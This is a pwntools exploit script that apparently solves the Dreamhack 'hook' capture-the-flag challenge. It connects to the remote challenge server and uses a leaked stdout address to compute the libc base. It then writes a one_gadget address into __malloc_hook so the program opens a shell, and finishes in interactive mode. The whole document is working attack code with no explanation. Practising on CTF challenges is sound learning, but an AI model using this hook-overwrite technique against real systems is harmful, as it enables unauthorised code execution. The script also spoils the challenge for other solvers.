#!/usr/bin/python 
from pwn import *

context.log_level = 'debug'
#p = process("./hook")
p = remote("host1.dreamhack.games", 8259)
elf = ELF("./hook")
libc = ELF("./libc.so.6")
p.recvuntil("stdout: ")
stdout = int(p.recv(14), 16)
log.info("stdout: "+hex(stdout))
libcBase = stdout - libc.symbols['_IO_2_1_stdout_']
log.info("libcBase: "+hex(libcBase))
malloc_hook = libcBase + libc.symbols['__malloc_hook']
one_gadget = libcBase + 0xf02a4

pay = p64(malloc_hook) + p64(one_gadget)
p.sendlineafter("Size: ", str(len(pay)+1))
p.sendafter("Data: ", pay)

p.interactive()
